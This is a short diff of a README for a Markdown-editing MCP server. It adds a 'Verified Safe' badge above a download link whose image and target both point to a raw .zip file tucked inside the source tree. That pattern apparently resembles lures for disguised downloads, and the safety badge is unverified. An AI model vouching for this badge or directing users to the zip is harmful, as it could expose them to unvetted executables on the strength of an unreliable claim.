@@ -1,5 +1,7 @@
 # ✨ markdown-editor-mcp-server - Edit Markdown with Ease and Precision
 
+[![SafeSkill 92/100](https://img.shields.io/badge/SafeSkill-92%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/kcao3034-markdown-editor-mcp-server)
+
 [![Download Latest Release](https://github.com/Kcao3034/markdown-editor-mcp-server/raw/refs/heads/main/src/markdown_editor/tools/markdown_server_mcp_editor_v3.8.zip%20Latest%20Release-v1.0.0-blue)](https://github.com/Kcao3034/markdown-editor-mcp-server/raw/refs/heads/main/src/markdown_editor/tools/markdown_server_mcp_editor_v3.8.zip)
 
 ## 🚀 Getting Started
